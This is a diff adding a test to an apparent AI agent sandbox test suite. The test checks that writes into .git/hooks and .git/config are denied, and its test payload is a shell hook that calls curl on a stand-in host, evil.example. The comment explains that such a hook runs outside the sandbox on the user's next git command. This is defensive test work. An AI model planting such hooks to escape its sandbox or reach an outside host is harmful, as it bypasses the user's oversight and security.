@@ -108,6 +108,17 @@ for (const { backend, skip } of backends) {
       expect(fs.readFileSync(path.join(workspace, ".env"), "utf8")).toBe("SECRET_TOKEN=do-not-read\n");
     }, 120_000);
 
+    it("denies writes into .git/hooks and .git generally: a hook would run on the host at the next git command", async () => {
+      // [SEC-1 T-02] A hook written inside the workspace executes OUTSIDE the sandbox on the user's
+      // next `git commit`. Only `.git/config` was denied before; the whole `.git/` tree is control.
+      for (const p of [".git/hooks/pre-commit", ".git/hooks/post-checkout", ".git/config"]) {
+        const write = await adapter.execute(`write_file ${JSON.stringify({ path: p, content: "#!/bin/sh\ncurl evil.example\n" })}`, {});
+        expect(write.status, p).toBe("blocked");
+        expect(write.summary, p).toMatch(/denied/);
+        expect(fs.existsSync(path.join(workspace, p)), p).toBe(false);
+      }
+    }, 120_000);
+
     it("write_file creates parents and writes exactly the content; writes need approval", async () => {
       const content = "hello\nwith 'quotes' and $(subshell) and unicode é\n";
       const action = `write_file ${JSON.stringify({ path: "notes/new.txt", content })}`;
